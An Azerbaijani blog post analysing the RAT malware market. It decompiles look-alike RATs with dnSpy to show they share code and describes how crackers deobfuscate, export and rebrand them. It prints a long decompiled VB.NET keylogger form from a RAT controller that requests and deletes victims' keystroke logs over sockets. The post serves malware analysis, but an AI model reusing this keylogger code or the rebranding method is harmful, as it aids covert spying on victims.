---
layout: post
pin: false
title: "RAT Alətləri və Bazarının Batışı."
author: rafosw
categories: [AZ]
tags: [RAT, Reverse Engineering, Malware]
#media_subpath: /images/ctf_magicctf
image:
  path: https://miro.medium.com/v2/resize:fit:1100/format:webp/1*B4nAfEaVAXZgII4pFTBVFw.png
---

Kibertəhlükəsizlik dünyasında bir çox təhdid aktoru Remote Access Trojan (RAT) istifadə edərək sistemlərə sızmağa çalışır. Ancaq RAT bazarına bir az daha dərindən baxdıqda, əslində ciddi bir innovasiya çatışmazlığı olduğunu görərik.

Bazarda dolaşan RAT-ların 70%-i bir-birinin kopyasıdır!

Çoxsaylı RAT-ların bir-birini təkrarlaması, hədəf sistemləri ələ keçirmək üçün əsasən eyni həllərə və yanaşmalara əsaslanır. Bu isə RAT-ların aşkarlanmasını və onlara qarşı müdafiə tədbirlərini asanlaşdırır.

Bu vəziyyət, bizim üçün əslində yaxşı bir xəbərdir. Təhdid aktorları, yenilikçi və çətin aşkar edilə bilən RAT-lar yaratmaqda çətinlik çəkdikcə, biz daha yaxşı müdafiə taktikaları inkişaf etdirə bilirik. Bununla yanaşı, biz də artıq istifadə edilən metodları və alətləri diqqətlə izləyərək, qarşı tərəfin yeni alətlərinin aşkarlanması və nəzarət altına alınması üçün daha səmərəli strategiyalar qura bilirik.

Gəlin bu məsələyə daha yaxından baxaq.

## Analiz

Aşağıdakı RAT-lara baxın, hər ikisi tamamilə fərqli proqram təminatı kimi görünür, elə deyilmi?

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tSLGnufrcuC0ioOc0UTQkw.png){: width="700" height="550"}

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*zQp_q7-g-i1zRVQ0O6yH3g.png){: width="700" height="550"}

Amma reallıqda hər şey göründüyü kimi deyil, RAT-ları decompilation edək.

Decompilation üçün istifadə edəcəyimiz proqram təminatı: dnSpy

dnSpy debugger və .NET assembly redaktorudur. Siz ondan heç bir mənbə kodu olmasa belə, assemblyləri redaktə etmək və debugging üçün istifadə edə bilərsiniz.

NOT: Əgər exe faylı .NET ilə yazılmayıbsa, dnSpy onu analiz edə bilməyəcək və bu halda Ghidra, IDA Pro və ya x64dbg kimi digər alətlərə ehtiyac olacaq.

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*LAHX5Bt3iSgWXLf_hKoVSw.png){: width="700" height="550"}

Yuxarıdakı fotoda gördüyünüz kimi, solda ikinci RAT-ın, sağda isə birinci RAT-ın namespace-ləri var və bu iki namespace eynidir, bu o deməkdir ki, hər iki RAT eyni RAT-ın nüsxələridir, crackerlər tərəfindən cracking yolu ilə hazırlanıb və yalnız GUI və adlar dəyişdirilib, Funksiyaları isə eynidir.

3-cü fotoda RAT-ları decompile etdiyimi görürsünüz. Çox adam indi düşünəcək ki, .exe faylları bu qədər asanlıqla decompilation olunur? Xeyir.

Bir çox developer öz proqram təminatlarını qorumaq üçün obfuscation adlanan bir şifrələmə üsulundan istifadə edir. Bu zaman işlər daha da çətinləşir

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*B4nAfEaVAXZgII4pFTBVFw.png){: width="700" height="550"}

Sol və sağdakı RAT-ların ikisi də eyni RAT-dır. Qırmızı çərçivənin içindəki namespace və Form kodu obfuscate edilmişdir; yaşıl çərçivənin içindəki namespace və Form kodu isə deobfuscate edilərək şifrəsi açılmışdır.

Obfuscate olunmuş RAT-ı decompile edərək fərdiləşdirmək, GUI və adını dəyişmək qeyri-mümkündür. Bu zaman reverse engineer-lər və ya cracker-lər ConfuserEx və ya de4dot kimi proqram təminatlarından istifadə edərək obfuscate olunmuş bir .exe faylını deobfuscate etməyə və fərdiləşdirməyə çalışırlar.

NOT: 60%-i uğursuz olur .NET obfuscation zamanı AES, XOR, Opaque Predicates, Code Flattening, Debugger Detection kimi müxtəlif alqoritmlər istifadə olunur. Ən güclü qoruma üçün bir neçə obfuscation texnikası eyni anda tətbiq edilir, bu da deobfuscation prosesini çətinləşdirir.

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*PfDIo5Sq4l-ZHavA-RBa3A.png){: width="700" height="550"}

Bir də əlavə etmək istəyirəm ki, RAT-ları dnSpy üzərində fərdiləşdirməkdənsə, çox vaxt cracker-lər dnSpy-da olan “Project Export” funksiyasından istifadə edərək RAT-ları bir .sln(Project Solution) faylına çevirirlər. Bu zaman RAT-ların fərdiləşdirilməsi daha rahat olur.(Bu zaman bəzi errorlar ortaya çıxır. Onları düzəltməsələr, Forms Preview kimi xüsusiyyətlər və daha coxu işləmir.)

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*2g3hjJdwZ7epX8xadV5uAA.png){: width="700" height="550"}

İndi isə gəlin bu məsələyə bir cracker yox, “developer” gözü ilə baxaq
RAT-lar adətən hackerlər tərəfindən .NET Framework Visual Studio Community istifadə edilərək yazılır.

Bir RAT-ın infrastrukturuna daha yaxından baxaq

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*10OzRLt5bVif0ILamaAMcA.png){: width="700" height="550"}

1. AngelAndroid: Bu, hazırda açıq olan layihə və ya həllin əsas qovluğudur. “AngelAndroid” adlı layihə burada yerləşir.

2. My Project: Projectin mənbə faylları, parametrləri və konfiqurasiyaları burada yerləşir. Bu qovluqda ümumiyyətlə tətbiqin konfiqurasiya faylları olur.

3. References: Projectdə istifadə olunan xarici kitabxanaları və istinadları ehtiva edir. Burada .NET Framework və ya digər üçüncü tərəf kitabxanaları olur.

4. Codes: Bu qovluq Projectin bütün kod fayllarını saxlayır. Ümumiyyətlə .vb (Visual Basic) və ya .cs (C#) kimi fayl uzantılarına malik kod faylları burada yerləşir. Məsələn, CameraManager.vb kimi fayllar burada olur.

5. Forms: Projectə aid formlar (qrafik istifadəçi interfeysləri) burada yerləşir. Bu fayllar ümumiyyətlə GUI (Qrafik İstifadəçi İnterfeysi) dizaynlarını ehtiva edir.

6. GeoIP: Bu qovluq Projectdə IP ünvanına əsaslanan coğrafi məlumatları işləmək üçün istifadə olunan faylları ehtiva edir.

7. Resources: Projectdə istifadə olunan bütün resurs faylları burada yerləşir. Bunlar ümumiyyətlə şəkillər, ikonlar, səs faylları və tətbiqin digər vizual materialları ola bilər.

8. Sockets : Bu qovluqda Projectdə şəbəkə üzərindən əlaqə qurulmasına yönəlmiş fayllar yerləşir.

9. Theme: Tətbiqin vizual üslub və dizayn elementlərinin idarə olunduğu qovluq.

10. App.config: Tətbiqin ümumi konfiqurasiya parametrlərinin yerləşdiyi fayldır. Verilənlər bazası bağlantıları, ümumi tətbiq ayarları və sistemə aid bəzi xüsusi konfiqurasiyalar.

11. app.manifest: Tətbiqin işləməsi üçün tələb olunan manifest faylıdır. Bu fayl tətbiqin sistemdə necə işləyəcəyi, hansı icazələrə sahib olacağı kimi məlumatları ehtiva edir.

İndi isə nümunə üçün gəlin, RAT-ın içində olan keylogger formuna və onun koduna baxaq.

![SS](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*k2nffgitzE-9Lg-o29lnnA.png){: width="700" height="550"}

Bu hissə, təhdid aktyorunun qurbanın klaviaturada yazdığı textləri görmək üçün nəzərdə tutulub.

```vb
Imports System.ComponentModel
 Public Class Keylogger
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Client
     Public Title As String = "null"
    Public IsActive As Boolean = False
     Public tmpFolderUSER, tmpClientName, tmpCountry, tmpAddressIP As String
    Sub New()
         InitializeComponent()
         Me.Font = reso.f
     End Sub
    Private Sub SpyStyle()
                      End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub Keylogger_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.ctxMenu.Renderer = New ThemeToolStrip
         DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f
         DGV0.DefaultCellStyle.Font = reso.f
         Me.DGV0.ContextMenuStrip = Me.ctxMenu
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\19.ico")
         Me.Text = Title
         SpyStyle()
         SaveToolStripMenuItem.Visible = True
         SaveAsToolStripMenuItem.Visible = True
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
    End Sub
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not IsActive Then
            MsgBox("Accessibilty Not Enabled.")
            Return
        End If
        If combologs.Text.Length < 1 Or combologs.Text Is Nothing Then
            MsgBox("No  Logs Found...")
            Return
        End If
         If Me.classClient IsNot Nothing Then
            Try
                Dim spl As String() = classClient.Keys.Split(":")



                Dim requestfilename As String = ""
                If combologs.Text.StartsWith("o-") Then
                    requestfilename = Codes.BSEN(combologs.Text.Replace("o-", ""))
                Else
                    requestfilename = combologs.Text.Replace("n-", "")
                End If


                Dim objs As Object() = {Client, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "rd<*>" & requestfilename & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), classClient}


                classClient.SendAsync(objs)
            Catch ex As Exception
             End Try
        End If
    End Sub
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Not IsActive Then
            MsgBox("Accessibilty Not Enabled.")
            Return
        End If
        If combologs.Text.Length < 1 Or combologs.Text Is Nothing Then
            MsgBox("No  Logs Found...")
            Return
        End If
         If Not MessageBox.Show("Log will deleted completely ," + vbNewLine + "Accept ?", "Keylogger", MessageBoxButtons.YesNo) = DialogResult.Yes Then
             Return
        End If
         If Me.classClient IsNot Nothing Then
            Try
                  Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "rdd<*>" & Codes.BSEN(combologs.Text) & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), classClient}
                 classClient.SendAsync(objs)
                Me.combologs.Text = ""
            Catch ex As Exception
             End Try
        End If
    End Sub
     Delegate Sub OffLOG(objs As Object())
    Public Sub Done(objs As Object())
        If Me.DataGridView1.InvokeRequired Then
            Dim logr As OffLOG = New OffLOG(AddressOf Done)
            Me.DataGridView1.Invoke(logr, New Object() {objs})
            Exit Sub
        Else
             Me.DataGridView1.Rows.Add(objs(0), objs(1), objs(2))
        End If
    End Sub
                       Private Sub Keylogger_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         If Not classClient Is Nothing Then
             classClient.Keylogg = False
             Dim objs As Object() = {Client, SecurityKey.KeysClient9 & sockets.Data.SPL_SOCKET & SecurityKey.Keylogger, Codes.Encoding().GetBytes("null"), classClient}
             classClient.SendAsync(objs)
         End If
     End Sub
     Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        reso.Directory_Exist(classClient)
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, tmpFolderUSER, "Keylogger",
        tmpClientName, tmpCountry & " - " & tmpAddressIP, "Keylogger", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
     End Sub
     Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim SaveAS As New SaveFileDialog
        SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
        SaveAS.Filter = "html (*.html)|*.html"
        If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, "null", SaveAS.FileName,
            tmpClientName, tmpCountry & " - " & tmpAddressIP, "Keylogger", "log", "null"})
        End If
        SaveAS.Dispose()
    End Sub
End Class
```

Bu, sadəcə 10-larla formun içində olan zərərli koddan biridir və bu kodu 10-dan çox RAT istifadə edir, sadəcə copy-paste edilir.

Developer-lər və ya hacker-lər deyək, onlar öz yazdıqları RAT-ların mənbə kodlarını çox bahalı qiymətlərə satırlar. Bu kodu alan bəzi kopy-pastercilər sadəcə üzərində kiçik GUI dəyişiklikləri edərək yayımlayırlar. Onlar obfuscation prosesini yaddan çıxarsalar, RAT 10-larla, hətta 100-lərlə dəfə kopyalanaraq internetin hər yerinə yayılmış olur

## SON

Kiber­təhlükəsizlikdə RAT bazarı digər kibertəhlükəsizlik sahələri kimi ciddi şəkildə inkişaf etməlidir. Malwarelər arasında ən çox istifadə edilənlərdən biri RAT-lardır, lakin bazarının vəziyyəti bərbaddır. Fərqli GUI, eyni funksiyalar və kodlar ilə çox sayda mənasız variant mövcuddur.